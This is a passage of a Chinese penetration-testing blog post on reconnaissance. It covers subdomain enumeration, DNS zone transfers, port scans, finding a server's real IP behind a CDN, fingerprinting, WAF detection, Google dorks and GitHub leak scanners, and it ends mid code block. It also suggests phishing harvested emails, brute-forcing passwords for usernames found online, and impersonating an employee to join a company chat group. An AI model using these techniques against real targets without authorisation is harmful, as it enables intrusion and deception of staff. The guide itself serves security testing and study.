pip install dnspython</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Subdomainbrute.py baidu.com</span><br></pre></td></tr></table></figure><p><a href="http://www.7kb.org/wp-content/uploads/2016/07/7kbscan-domain-gather-V2.6.zip" target="_blank" rel="noopener">7kbscan domain gather</a></p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain猪猪侠</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsburte.py -d domain</span><br></pre></td></tr></table></figure><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">SubBrute</a> - 是一个开源项目，DNS爬虫，能够使用字典爆破子域名，也是一个python库。 </p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a> - 是一个开源项目，整合了SubBrute，并且能够在网上收集公开的域名数据。 </p><p>Sublist3r会列举出使用Google、Yahoo、Bing、Baidu和Ask等搜索引擎查找到的子域名。Sublist3r还会列举使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS查找到的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sublist3r.py -d ichunqiu.com</span><br></pre></td></tr></table></figure><p>theHarvester（DNS、社会工程学工具、被动）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theharvester -d ichunqiu.com -l 100 -b bing</span><br></pre></td></tr></table></figure><p><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">JSFinder</a>获取URL和子域名的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u https://www.x.com/</span><br><span class="line">python3 JSFinder.py -u https://www.x.com/ -d -ou jd_url.txt -os jd_domain.txt</span><br><span class="line">#-d 深度爬取 -ou 保存URL -os 保存domain</span><br><span class="line">python JSFinder.py -f text.txt#指定URL</span><br><span class="line">python JSFinder.py -f text.txt -j#指定JS</span><br></pre></td></tr></table></figure><p><a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration" target="_blank" rel="noopener">bugcrowd-levelup-subdomain-enumeration</a> - Bharath在Bugcrowd Levelup的议题用到的工具，包含子域名枚举脚本、CTlog查询脚本。 </p><p><a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="noopener">DNSrecon</a> - DNS枚举脚本 <a href="https://github.com/davidpepper/fierce-domain-scanner" target="_blank" rel="noopener">Fierce.pl Domain Scanner</a> - perl写的子域名爆破脚本 </p><p><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">AQUATONE</a> - 一款强大的域名工具，可以查子域名相同指纹站点。 <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a> - 一款社会工程学工具，有查询子域名的功能。</p><p><a href="https://github.com/blechschmidt/massdns.git" target="_blank" rel="noopener">MassDNS</a> - 一款域名解析工具，可以用于爆破子域名。 </p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">Alt-DNS</a> - 根据已知域名排列或关键词生成字典来爆破子域名。 </p><p><a href="https://github.com/jhaddix/domain" target="_blank" rel="noopener">无名的，基于recon-ng和Alt-DNS的域名爆破脚本</a> </p><p><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">Domain Analyzer</a> - 一个分析域名的工具，可以用来查子域名 </p><p><a href="https://github.com/jfrancois/SDBF" target="_blank" rel="noopener">Smart DNS Brute Forcer</a> - 卢森堡大学的学术型工具，结合Markov chain Models生成域名。 </p><p><a href="https://github.com/evilsocket/xray" target="_blank" rel="noopener">XRay</a> - 一款情报收集工具，有子域名收集功能 </p><p><a href="https://github.com/coco413/DiscoverSubdomain" target="_blank" rel="noopener">DiscoverSubdomain</a> - 自动化收集子域名工具，集成了多类子域名获取功能 </p><p><a href="https://github.com/franccesco/getaltname" target="_blank" rel="noopener">GetAltName</a> - 根据SAN获取其他域名 </p><p><a href="https://github.com/bit4woo/teemo.git" target="_blank" rel="noopener">Teemo</a> - 一款域名和邮箱的信息收集工具，挺全的，就是没SSL的收集路径 </p><p><a href="https://github.com/sawzeeyy/Sanitiz3r.git" target="_blank" rel="noopener">Sanitiz3r</a> - 中规中矩的域名爆破脚本，可以检测HTTP服务</p><p><strong>置换扫描</strong></p><p>Altdns使用已经已知的域名或子域名的排列、变更和突变来识别新的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python altdns.py -i icann.domains -o data_output -w icann.words -r -s results_output.txt</span><br></pre></td></tr></table></figure><p><strong>客户端接口</strong></p><p><strong>github等托管平台</strong></p><p><strong>NMap</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute --script-args dns-brute.domain=target.com,dns-brute.threads=6,dns-brute.hostlist=dict.lst</span><br></pre></td></tr></table></figure><h3 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h3><p>ICP备案查询</p><p><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">http://www.beian.miit.gov.cn/publish/query/indexFirst.action</a></p><p>公安部备案查询</p><p><a href="http://beian.gov.cn/portal/recordQuery" target="_blank" rel="noopener">http://beian.gov.cn/portal/recordQuery</a></p><h2 id="2-服务器信息"><a href="#2-服务器信息" class="headerlink" title="2. 服务器信息"></a>2. 服务器信息</h2><h3 id="DNS分析"><a href="#DNS分析" class="headerlink" title="DNS分析"></a>DNS分析</h3><p>通过查询DNS信息，我们可能可以发现网站的真实ip地址，也可以尝试测试是否存在DNS域传送漏洞。</p><p>查找某域名下所有主机和IP地址(子域名)</p><p>DNS记录类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SOA授权管理该域的服务器</span><br><span class="line">NS名称解析服务器</span><br><span class="line">AIPv4地址</span><br><span class="line">AAAAAIPv6地址</span><br><span class="line">MX邮件服务器地址</span><br><span class="line">PTR逆向解析记录</span><br><span class="line">CNAME别名记录</span><br><span class="line">SRV提供的服务[优先级,权重,端口,实际提供服务的主机名]</span><br><span class="line">TXT</span><br></pre></td></tr></table></figure><p>nslookup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup example.com</span><br></pre></td></tr></table></figure><p>host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">host example.com#默认A、AAAA、MX</span><br><span class="line">host -a example.com#默认查询的DNS服务器，在文件/etc/resolv.conf中</span><br><span class="line">host -a example.com8.8.8.8#指定查询的DNS服务器</span><br><span class="line">host -l example.comns4.isp.com#域传输（配置不当，概率较小）</span><br></pre></td></tr></table></figure><p>dig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig example.com#默认A</span><br><span class="line">dig example.com any#全部类型的记录</span><br><span class="line">dig @ns4.isp.com example.com axfr#域传输</span><br></pre></td></tr></table></figure><p>dnsenum</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dnsenum example.com#ip、NS、MX、自动尝试域传输</span><br><span class="line">dnsenum -f dns.txt example.com #暴力破解子域名</span><br><span class="line">dnsenum -p (page) -s (num) --threads 20 ichunqiu.com #没有成功</span><br></pre></td></tr></table></figure><p>dnsdict6(IPv6)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsdict6 example.com</span><br><span class="line">dnsdict6 -d -4 example.com#IPv4、DNS、NS</span><br></pre></td></tr></table></figure><p>fierce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fierce -dns example.com -threads 3#NS、域传输、字典爆破</span><br></pre></td></tr></table></figure><p>dmitry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dmitry -iwnse example.com#whois、google</span><br><span class="line">dmitry -p example.com -f -b#端口扫描(鸡肋)</span><br></pre></td></tr></table></figure><p>Sublist3r</p><p>Sublist3r会列举出使用Google、Yahoo、Bing、Baidu和Ask等搜索引擎查找到的子域名。Sublist3r还会列举使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS查找到的子域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sublist3r.py -d ichunqiu.com</span><br></pre></td></tr></table></figure><p>DNSRecon</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dnsrecon.py -n ns1.insecuredns.com –d insecuredns.com -D subdomains-top1mil-5000.txt -t brt</span><br></pre></td></tr></table></figure><p>nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script dns-brute --script-args dns-brute.domain=target.com,dns-brute.threads=6,dns-brute.hostlist=dict.lst</span><br></pre></td></tr></table></figure><p><strong>部分网站</strong></p><p><a href="https://www.virustotal.com/" target="_blank" rel="noopener">VirusTotal</a>是一个在线检测恶意样本或链接的网站，有自己的DNS数据集。</p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">DNSdumpster</a>是一个免费的域名分析网站，是HackerTarget旗下项目，可以查询相关的子域名或者旁站域名。</p><p><img src="/2019/06/24/信息收集/1557753338673.png" alt="1557753338673"></p><p><a href="http://viewdns.info/" target="_blank" rel="noopener">ViewDNS</a>是一个DNS工具大全,可以查各种DNS信息。</p><p><strong>DNS域传递</strong></p><p>区域传送是DNS事务的一种类型，DNS服务器将一个完整或部分的区域文件副本传递给另一个DNS服务器。如果区域传送没有被安全地配置，任何人都可以在服务器上启动区域传送，并获得该区域文件的副本。而区域文件包含了许多关于该区域和驻留在该区域的主机的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dig +multi AXFR @ns1.insecuredns.com insecuredns.com</span><br><span class="line">dig AXFR@nameserver domain</span><br><span class="line">dnsenum domain</span><br><span class="line"></span><br><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-trans</span><br><span class="line">fer.domain=nwpu.edu.cn -p 53 -Pn dns.nwpu.edu.cn</span><br></pre></td></tr></table></figure><h3 id="端口-amp-服务"><a href="#端口-amp-服务" class="headerlink" title="端口&amp;服务"></a>端口&amp;服务</h3><p><strong>Nmap</strong></p><p><strong>御剑高速端口扫描器</strong></p><p>masscan（扫描端口、服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-200 192.168.11.1-192.168.11.20</span><br></pre></td></tr></table></figure><p>端口对应服务</p><p><img src="/2019/06/24/信息收集/1559653838763.png" alt="1559653838763"></p><h3 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h3><p><strong>思路</strong></p><ol><li><p>二级域名法 一般网站不会所有的二级域名放CDN，因此我们可以利用这点来获取网站的真实ip </p></li><li><p>多地ping法 由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN</p></li><li><p>nslookup法 找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP </p></li><li><p>查看邮件法 通过查看邮件原文来确定ip地址，CDN总不会发送邮件吧</p></li><li><p>RSS订阅法 RSS原理于邮件法差不多</p></li><li><p>查看历史解析记录法 查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址</p><p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br>&lt;<a href="https://toolbar.netcraft.com/site_report?url" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url</a><br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a></p></li><li><p>插远程图片的方法，查看服务器的来源</p></li><li>利用网站漏洞（XSS、命令执行、SSRF、php探针、phpinfo页面等） 可以通过一些页面和漏洞获取到服务器ip地址也是可能的。</li></ol><p><strong>国外数据泄露收集与查询平台</strong></p><p><a href="https://haveibeenpwned.com/PwnedWebsites" target="_blank" rel="noopener">https://haveibeenpwned.com/PwnedWebsites</a><br><a href="https://canar.io/" target="_blank" rel="noopener">https://canar.io/</a><br><a href="http://breachalarm.com/" target="_blank" rel="noopener">http://breachalarm.com/</a><br><a href="https://pwnedlist.com/" target="_blank" rel="noopener">https://pwnedlist.com/</a><br><a href="https://archive.fbi.ninja/" target="_blank" rel="noopener">https://archive.fbi.ninja/</a><br><a href="https://cryptome.wikileaks.org/frontpage" target="_blank" rel="noopener">https://cryptome.wikileaks.org/frontpage</a><br><a href="https://cryptome.org/" target="_blank" rel="noopener">https://cryptome.org/</a><br><a href="http://databases.land/" target="_blank" rel="noopener">http://databases.land/</a><br><a href="https://vigilante.pw/" target="_blank" rel="noopener">https://vigilante.pw/</a></p><h3 id="路由信息"><a href="#路由信息" class="headerlink" title="路由信息"></a>路由信息</h3><p>traceroute(可能会被防火墙拦截)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute www.example.com</span><br></pre></td></tr></table></figure><p>tcptraceroute（探测开启的TCP端口不会被拦截）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcptraceroute www.example.com</span><br></pre></td></tr></table></figure><p>tctrace</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tctrace -i eth0 -d www.example.com</span><br></pre></td></tr></table></figure><h3 id="系统类型-amp-版本"><a href="#系统类型-amp-版本" class="headerlink" title="系统类型&amp;版本"></a>系统类型&amp;版本</h3><p>windows大小写不敏感</p><p>banner信息</p><p>特殊端口服务</p><p>Nessus扫描</p><h2 id="3-Web应用信息"><a href="#3-Web应用信息" class="headerlink" title="3. Web应用信息"></a>3. Web应用信息</h2><h3 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h3><p><strong>操作系统&amp;中间件信息&amp;数据库&amp;编程语言</strong></p><p>Nmap </p><p>wappalyzer插件 </p><p>云悉</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>指纹识别常见的检测对象：</p><ul><li>CMS（内容管理系统）信息<ul><li>dede织梦、wordpress、thinkphp、phpcms、thinkphp(框架)、ecshop、帝国、ezcms、Discuz、大汉CMS、魅力、海洋cms、逐浪cms Zoomla、drupal、EarCMS、思途CMS</li></ul></li><li>前端技术：<ul><li>HTML5、jquery、bootstrap、pure、ace、ajax等等</li></ul></li><li>中间件：apache、IIS、nginx、lighttpd、tomcat、weblogic、jboss、websphere 等等</li><li>开发语言：Java、PHP、Python、Ruby、Go、C# 等等</li><li>操作系统：Windows NT、类UNIX（macOS）</li><li>CDN信息：是否使用CDN<ul><li>常用cloudflare、360CDN、365cyd等等</li></ul></li><li>端口或者服务：</li><li>IP或者域名信息：</li><li>WAF：检测是否有WAF<ul><li>云盾、云锁、安全狗、IPS/IDS、等等</li></ul></li></ul><p>指纹识别方式：</p><ol><li><p>文件的MD5值（一对一）</p></li><li><p>关键词（robots.txt、powered by 、报错、URL、第三方插件等等）</p><ul><li>readme.txt、License.txt、help.txt等文件。</li><li>指定路径下指定图片文件，如一些小的图标文件，后台登录页面中的图标文件等，一般管理员不会修改它们。</li><li>404页面</li><li>302返回时的旗标</li></ul></li><li><p>响应头信息</p><ol><li>Server</li><li>X-Powered-By</li><li>Access-Control-Allow-Origin</li><li>WWW-Authenticate:判断网络设备</li></ol></li><li><p>URL中可能包含关键词（dede、wp-admin、wp-includes、slor、wls-wsat）</p></li><li><p>开发语言</p><ol><li>浏览器插件</li><li>Wappalyzer</li><li>URL识别</li><li>前端代码<ul><li>指定路径下指定名称的js文件或代码</li><li>指定路径下指定名称的css文件或代码</li><li><code>&lt;title&gt;</code>中的内容，有些程序标题中会带有程序标识</li><li>meta标记中带程序标识中带程序标识。</li><li>display:none中的版权信息。</li><li>页面底部版权信息，关键字© Powered by等。</li><li>注释掉的html代码中&lt;!–</li></ul></li><li>报错信息</li><li>respronse</li><li>set-cookie<ol><li>php  PHPSESSID</li><li>jsp  JSESSIONID</li><li>net  ASP.NET_SESSIONID</li></ol></li></ol></li><li><p>工具 </p><p>WhatWeb（识别网站类型）ruby apt install whatweb 2000+插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v https://freebuf.com</span><br></pre></td></tr></table></figure><p>x-scan<br>nmap（端口、WAF、漏洞）<br>wpscan 使用Ruby开发，扫描Wordpress站点的漏洞以及插件漏洞</p><p>Plecost 用于探测wordpress的漏洞，可以直接给出当前站点的漏洞利用方法(CVE)<br>BlindElephant Web指纹识别工具<br>御剑web指纹识别程序（win）<br>Test404轻量WEB指纹识别（win）<br>w11scan分布式WEB指纹识别平台（docker 识别500+种类型）<br>Dayu指纹识别工具<br>WebEye<br>WTF_Scan<br>Webfinger</p></li><li><p>在线平台指纹识别</p><p>云悉指纹识别<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>bugscaner指纹识别<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>whatweb.net<a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a><br>TideFinger潮汐在线指纹识别<a href="http://finger.tidesec.net" target="_blank" rel="noopener">http://finger.tidesec.net</a></p></li></ol><h3 id="探测WAF"><a href="#探测WAF" class="headerlink" title="探测WAF"></a>探测WAF</h3><p>WAF也称Web应用防护系统，Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p>原理：WAF识别大多基于Headers头信息。通过发送恶意的内容，对比响应，寻找数据包被拦截、拒绝或者检测到的标识。</p><p><strong>检测方法</strong></p><p>先通过工具判断，如果工具检测到WAF的存在，再手工验证是否误报；如果工具检测不到WAF，再通过手工判断WAF是否存在。</p><ul><li><p>工具（WAFW00F、Nmap）</p><p>Nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p80,443  --script=http-waf-detect 192.168.9.102</span><br><span class="line">nmap -p80,443  --script=http-waf-fingerprint 192.168.9.102</span><br></pre></td></tr></table></figure><p>waf00f探测WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waf00f -a www.example.com</span><br></pre></td></tr></table></figure></li><li><p>手工（提交恶意数据） </p><p>在网址URL参数后面输入恶意数据，通过提交后被WAF拦截得知WAF信息。</p></li></ul><h3 id="敏感目录及敏感信息、源码泄露（搜索引擎-工具）"><a href="#敏感目录及敏感信息、源码泄露（搜索引擎-工具）" class="headerlink" title="敏感目录及敏感信息、源码泄露（搜索引擎+工具）"></a>敏感目录及敏感信息、源码泄露（搜索引擎+工具）</h3><p>包括 子域名 用户名 密码 邮箱 源代码 等</p><ol><li><p>御剑</p><p>需要强大的字典，完善自己的字典</p></li><li><p><a href="https://mega.nz/#!pNFQ0JYT!AHFfiw76-A7KdpnvBUK6_9uPPbICg0Z4WqNkzjbAq00" target="_blank" rel="noopener">7kbscan-WebPathBrute 1.5.6 (集成三字典)(自行扶墙)</a></p></li><li><p>搜索引擎信息</p><p>国外</p><ul><li>Google</li><li>Bing</li><li>Yahoo</li></ul><p>国内</p><ul><li>baidu</li><li>haosou</li><li>sougou</li></ul><p>google基本语法</p><p>| 语法      | 功能                                                         |<br>| ——— | ———————————————————— |<br>| index of: | 直接进入到网站首页下的所有文件和文件夹中                     |<br>| intext:   | 查询网页正文中包含的关键词的网站                             |<br>| intitle:  | 返回网站标题中含有关键词的网站                               |<br>| cache:    | 搜索Google里关于某些内容缓存                                 |<br>| define:   | 查询某些词语的定义                                           |<br>| filetype: | 搜索指定类型的文件：doc、pdf、bak、zip、mdb、inc、config.inc |<br>| info:     | 查找指定站点的信息                                           |<br>| inurl:    | 在URL中寻找我们制定的关键信息 inurl:admin.php、login.php     |<br>| link:     | 返回所有和目标做了链接的URL                                  |<br>| site:     | 返回和目标有关（子域名）的所有URL                            |<br>| +         | 扩大搜索范围                                                 |<br>| -         | 忽略某些关键词                                               |<br>| |        | 或                                                           |<br>| ~         | 搜索同义词                                                   |<br>| .         | 单一的通配符  admi..php                                      |<br>| <em>         | 多个字符的通配符 admin</em>php                                   |<br>| “”        | 精准匹配                                                     |</p><p>搜索敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ooxx.com filetype:xls</span><br></pre></td></tr></table></figure><p>比如目标的某个系统手册演示的截图中截图到了用户名，然后我们可以根据用户名来爆破密码；甚至可以看看有没有写系统默认密码，或者一些后台的目录路径，如果有目录就可以尝试对其访问，说不定有未授权。</p><p>对后台进行查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx admin</span><br><span class="line">site:xxx.xxx login </span><br><span class="line">site:xxx.xxx system</span><br><span class="line">site:xxx.xxx 管理</span><br><span class="line">site:xxx.xxx 登录 </span><br><span class="line">site:xxx.xxx 内部</span><br><span class="line">site:xxx.xxx 系统</span><br></pre></td></tr></table></figure><p>还可以查找邮箱，然后进行钓鱼：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx 邮件</span><br><span class="line">site:xxx.xxx email</span><br></pre></td></tr></table></figure><p>还可以查找qq群等，然后假装员工验证进去看群文件泄露了什么东东（这里有个技巧，去找客服聊天处，然后对整个过程抓包也就是看历史请求，如果运气好可能在请求的返回包中返回客服的姓名，如果只单纯的泄露了姓如<strong>张xx</strong>，那么你加群的时候就说你是<strong>小张工作号</strong>，说这个工作号的原因是可能小张已经在群里了）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.xxx qqsite:xxx.xxx 群site:xxx.xxx 企鹅site:xxx.xxx 腾讯</span><br></pre></td></tr></table></figure><p>还可以对寻找一些公开的、危害大、普遍的漏洞的指纹，如下面的搜索jboss系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:ooxx.com inurl:jmx-console</span><br></pre></td></tr></table></figure><p><strong>theharvester</strong></p><p>收集电子邮件账号、用户名、子域名信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">theharvester -d example.com -l 100 -b google</span><br><span class="line">theharvester -d example.com -l 100 -b linkedin</span><br></pre></td></tr></table></figure><p><strong>Metagooofil</strong></p><p>通过Google引擎搜索目标域的文件的元数据信息（metadata：doc, xls, ppt, pdf）</p><p>内部操作流程：</p><ul><li>使用Google引擎在目标域内搜索指定的文件类型</li><li>把搜索到的文档保存到本地磁盘</li><li>从下载文件中解析元数据信息</li><li>把元数据信息的分析结果保存为HTML文件</li></ul><p>元数据信息：</p><ul><li>用户名</li><li>软件版本</li><li>服务器名或主机名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">metagoofil -d example.com -l 20 -t doc,pdf -n 5 -f test.html -o test</span><br><span class="line">-d 目标域, -t 文件类型 -o 保存目录 -l 每种文件收集个数 -n 下载个数 -f 分析报告</span><br></pre></td></tr></table></figure></li><li><p>github敏感信息</p><p><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a> (GitHub敏感信息扫描工具)</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a> (GitHub敏感信息扫描工具,包括检测commit等)</p><p><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a> (企业资产GitHub泄露监控系统）</p><p><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a> （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具）</p></li><li><p>BBscan </p><p>BBscan是一款信息泄漏批量扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>在windows平台运行需要解决依赖问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br><span class="line">BBScan.py --full-scan --no-crawl --no-check404 -t2 -p50 -f iqiyi.http.txt</span><br></pre></td></tr></table></figure><p>使用示例</p><ol><li>扫描单个web服务 <a href="http://www.target.com" target="_blank" rel="noopener">www.target.com</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py  --host www.target.com</span><br></pre></td></tr></table></figure><ol start="2"><li>扫描<a href="http://www.target.com和www.target.com/28下的其他主机" target="_blank" rel="noopener">www.target.com和www.target.com/28下的其他主机</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py  --host www.target.com --network 28</span><br></pre></td></tr></table></figure><ol start="3"><li>扫描txt文件中的所有主机</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -f wandoujia.com.txt</span><br></pre></td></tr></table></figure><ol start="4"><li>从文件夹中导入所有的主机并扫描</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -d targets/  --browser</span><br></pre></td></tr></table></figure><ol start="5"><li>如果是为了去各大src刷漏洞，可以考虑把所有域名保存到targets文件夹下，然后</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python BBScan.py -d targets/ --network 30</span><br></pre></td></tr></table></figure></li><li><p>GSIL</p><p>GSIL是一款由python3写的从github上寻找敏感文件的安全工具。</p><p>项目地址：<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p><p>安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>然后需要给它进行配置</p><p><img src="/2019/06/24/信息收集/640.webp" alt="img"></p><p>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 启动测试</span><br><span class="line">python3 gsil.py test</span><br><span class="line"># 测试token有效性</span><br><span class="line">python3 gsil.py --verify-tokens</span><br></pre></td></tr></table></figure></li><li><p>社交平台</p><ul><li>QQ群</li><li>文库</li><li>求职网</li><li>论坛</li><li>公告</li><li>新闻</li><li>新媒体</li><li>博客</li><li>社交网络</li><li>其他相关网站</li></ul></li><li><p>敏感文件/目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 